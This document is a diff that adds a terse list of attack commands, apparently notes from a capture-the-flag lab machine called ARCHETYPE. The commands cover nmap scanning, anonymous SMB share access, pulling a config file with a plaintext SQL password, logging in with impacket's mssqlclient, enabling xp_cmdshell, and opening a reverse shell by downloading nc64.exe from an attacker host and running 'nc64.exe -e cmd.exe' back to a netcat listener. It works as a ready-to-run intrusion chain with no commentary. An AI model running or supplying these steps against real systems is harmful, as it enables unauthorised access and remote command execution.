@@ -1,0 +1,39 @@
+nmap -sC -sV 10.129.95.187
+smbclient -N -L \\\\10.129.95.187\\
+smbclient -N \\\\10.129.95.187\\backups
+dir
+get prod.dtsConfig
+exit
+cat prod.dtsConfig
+M3g4c0rp123
+help
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+pip3 install .
+#OR:
+sudo python3 setup.py install
+#In case you are missing some modules:
+pip3 install -r requirements.txt
+
+cd impacket/examples/
+python3 mssqlclient.py -h
+
+python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth
+
+SQL>help
+
+SQL>SELECT is_srvrolemember('sysadmin');
+
+SQL> EXEC xp_cmdshell 'net user';
+SQL> EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+xp_cmdshell "whoami"
+sudo python3 -m http.server 80
+sudo nc -lnvp 443
+
+xp_cmdshell "powershell -c pwd"
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe"
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443"
